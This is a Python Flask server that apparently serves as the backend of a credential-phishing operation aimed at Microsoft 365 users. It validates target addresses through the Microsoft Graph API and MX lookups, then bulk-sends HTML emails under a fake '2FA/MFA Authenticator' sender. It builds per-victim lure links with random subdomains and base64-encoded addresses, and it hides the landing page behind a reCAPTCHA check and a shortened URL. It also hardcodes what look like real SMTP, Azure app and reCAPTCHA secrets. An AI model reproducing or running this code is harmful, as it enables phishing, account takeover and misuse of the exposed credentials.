import base64
import random
import string
import threading
from datetime import datetime
import dns.resolver

import requests
from flask import Flask, request, jsonify, render_template, make_response
from flask_cors import CORS
from flask_mail import Mail, Message
from msal import ConfidentialClientApplication

app = Flask(__name__)
cors = CORS(app)
#cors = CORS(app, resources={r"/*": {"origins": ["https://dnie.evelinrosa.com.br", "https://evelinrosa.com.br"]}})
app.config['CORS_HEADERS'] = 'Content-Type'


RECAPTCHA_SECRET_KEY = '6LdYBq4pAAAAAOIqH4lzSfJPysyS30UHDF1Sorwf'
app.config.update(
    MAIL_SERVER='mail.telemark-austria.at',
    MAIL_PORT=587,
    MAIL_USE_TLS=True,
    MAIL_USE_SSL=False,
    MAIL_USERNAME='arno.klien@telemark-austria.at',
    MAIL_PASSWORD='sitteR9*',
)
mail = Mail(app)

# Constants and Configuration
CLIENT_ID = '03ac47e5-9188-43d9-a28f-522a455ad787'
TENANT_ID = '38792c4e-29b9-4771-87d2-7cb7ca160c93'
CLIENT_SECRET = 'L4Z8Q~H15tBnJcADZYiRHoOBeJn5gePt6ijzvaFL'
AUTHORITY = f'https://login.microsoftonline.com/{TENANT_ID}'
SCOPE = ['https://graph.microsoft.com/.default']

# MSAL Confidential Client Application
client_app = ConfidentialClientApplication(
    CLIENT_ID,
    authority=AUTHORITY,
    client_credential=CLIENT_SECRET,
)


@app.route('/validate-email', methods=['POST'])
def validate_email():
    # Get the email from request data
    email = request.json.get('email', '')
    if not email:
        return jsonify({'error': 'Email parameter is missing'}), 400

    # Acquire token for Graph API
    token_response = client_app.acquire_token_for_client(scopes=SCOPE)
    access_token = token_response.get('access_token')
    print(access_token)
    if not access_token:
        return jsonify({'error': 'Failed to acquire access token'}), 500

    # Call Microsoft Graph API to check if the email exists

    graph_api_url = f'https://graph.microsoft.com/v1.0/users/{email}'
    headers = {'Authorization': f'Bearer {access_token}'}
    response = requests.get(graph_api_url, headers=headers)
    print(response.json())

    if response.status_code == 200:
        return jsonify({'isRegistered': True}), 200
    elif response.status_code == 404:
        return jsonify({'isRegistered': False}), 200
    else:
        return jsonify({'error': 'Failed to query Microsoft Graph API'}), response.status_code


@app.route('/validate-domain', methods=['POST'])
def check_mx_records():
    domain = request.json.get('domain', '')
    if not domain:
        return jsonify({'error': 'Domain parameter is missing'}), 400
    try:
        records = dns.resolver.resolve(domain, 'MX')
        is_microsoft_related = any('outlook.com' in str(record.exchange).lower() for record in records)
        return jsonify({'isMicrosoftRelated': is_microsoft_related}), 200
    except dns.resolver.NoAnswer:
        return jsonify({'isMicrosoftRelated': False, 'error': 'No MX records found'}), 404
    except Exception as e:
        print(f"An error occurred: {e}")
        return jsonify({'error': 'Failed to fetch MX records', 'details': str(e)}), 500


# Function to set CSP headers in the response
def set_csp_headers(response):
    response.headers[
        'Content-Security-Policy'] = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; TrustedHTML 'self';"
    return response

def send_async_email(app, msg):
    with app.app_context():
        mail.send(msg)

def send_email(to, subject, custom_email_content):
    # msg = Message(subject, sender='2­F­A­/­M­F­A­ ­A­u­t­h­e­n­t­i­c­a­t­o­r', recipients=[to])
    msg = Message(subject, sender=app.config['MAIL_USERNAME'], recipients=[to])
    msg.html = custom_email_content
    threading.Thread(target=send_async_email, args=(app, msg)).start()

def customize_email_content(template, bindings, email):
    # Create a copy of the bindings dictionary
    local_bindings = bindings.copy()

    # Customize email content
    now = datetime.now()
    formatted_date = now.strftime("%A, %B %d, %Y")

    username = email.split("@")[1].split(".")[0]
    servicerequestnumber = '{:08d}'.format(random.randint(0, 99999999))
    base64email = base64.b64encode(email.encode()).decode('utf-8')

    local_bindings['user_name'] = username
    local_bindings['service_request_number'] = servicerequestnumber
    local_bindings['date_long'] = formatted_date
    local_bindings['email'] = email

    baseurl = local_bindings.get('action_url', '')  # Assuming action_url is already in the bindings
    scheme, domain = baseurl.split('://')

    # Generate random values
    random_word = random.choice(['book', 'read', 'author', 'story', 'chapter'])  # Add more words as needed
    random_value = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))

    # Update the URL
    updated_url = f"{scheme}://{random_word}.{domain}/{random_value}/{base64email}"
    # updated_url = f"{scheme}://{domain}/{random_value}/{base64email}"
    local_bindings['action_url'] = updated_url

    return render_template(template, **local_bindings)


@app.route('/sendEmail', methods=['POST'])
def send_email_endpoint():
    data = request.json
    try:
        subject = data.get('subject', 'Starter')
        template = data['template']
        bindings = data['bindings']
        emails = data['emails']

        for email in emails:
            customized_message = customize_email_content(template, bindings, email)
            send_email(email, subject, customized_message)

        response = jsonify({"message": "Emails sent successfully"}), 200
    except Exception as e:
        response = jsonify({"error": str(e)}), 500

    # Create a response object using make_response
    response = make_response(response)
    # Add CSP headers to the response
    return set_csp_headers(response)



@app.route('/random-digit')
def random_digit():
    # Generate a random 10-digit number
    random_number = ''.join(["%s" % random.randint(0, 9) for num in range(0, 10)])
    finalUrl = f'https://{random_number}.filipedias.adv.br/'
    return jsonify({"random_digit": finalUrl})


@app.route('/verify-recaptcha', methods=['POST'])
def verify_recaptcha():
    try:
        token = request.json.get('token')
        verification_url = 'https://www.google.com/recaptcha/api/siteverify'
        payload = {
            'secret': RECAPTCHA_SECRET_KEY,
            'response': token
        }
        response = requests.post(verification_url, data=payload)
        data = response.json()
        print((data))
        if data.get('success'):
            home = "https://tinyurl.com/bigBor5#X"
            #Returning Namo link
            return jsonify({'success': True, 'home': home}), 200
        else:
            return jsonify({'success': False, 'error': 'reCAPTCHA verification failed'}), 400
    except Exception as e:
        return jsonify({'success': False, 'error': 'Internal server error'}), 500




if __name__ == '__main__':
    app.run(debug=True)
